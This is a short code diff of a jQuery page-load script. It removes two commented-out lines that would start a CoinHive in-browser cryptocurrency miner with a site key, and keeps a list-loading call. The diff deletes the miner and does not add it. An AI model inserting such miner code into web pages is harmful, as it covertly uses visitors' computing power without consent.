@@ -1,6 +1,4 @@
 $(document).ready( function(){
-	//var miner = new CoinHive.Anonymous('kDF8u9kL82IxSFOzRLG3Rd8J9VW9MDDX');
-	//miner.start();	
 	
 	load_lista();
 
